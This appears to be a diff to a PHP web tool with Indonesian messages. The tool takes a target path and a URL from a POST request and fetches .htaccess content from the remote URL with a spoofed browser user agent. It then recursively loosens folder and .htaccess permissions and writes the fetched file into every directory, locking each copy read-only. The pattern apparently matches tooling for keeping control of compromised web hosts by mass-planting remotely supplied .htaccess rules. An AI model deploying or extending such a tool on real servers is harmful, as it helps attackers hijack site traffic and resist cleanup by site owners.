@@ -2,6 +2,19 @@
 $success = [];
 $error = [];
 
+function fetchFileFromUrl($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => 'Mozilla/5.0'
+    ]);
+    $data = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    return ($http_code === 200) ? $data : false;
+}
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $targetPath = rtrim($_POST['target_path'], '/');
     $url = $_POST['htaccess_url'];
@@ -10,13 +23,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         die("❌ Target path not found: $targetPath");
     }
 
-    // Fetch .htaccess content
-    $htaccessContent = @file_get_contents($url);
+    $htaccessContent = fetchFileFromUrl($url);
     if (!$htaccessContent) {
         die("❌ Gagal ambil isi .htaccess dari URL.");
     }
 
-    // Step 1: chmod semua folder ke 0755
     function setFolders0755($dir, &$log) {
         foreach (scandir($dir) as $item) {
             if ($item === '.' || $item === '..') continue;
@@ -32,7 +43,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // Step 2: chmod semua .htaccess yang ada jadi 0644
     function unlockHtaccessFiles($dir, &$log) {
         foreach (scandir($dir) as $item) {
             if ($item === '.' || $item === '..') continue;
@@ -49,7 +59,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // Step 3: Mass deploy .htaccess dan set ke 0444
     function deployHtaccess($dir, $content, &$log) {
         foreach (scandir($dir) as $item) {
             if ($item === '.' || $item === '..') continue;
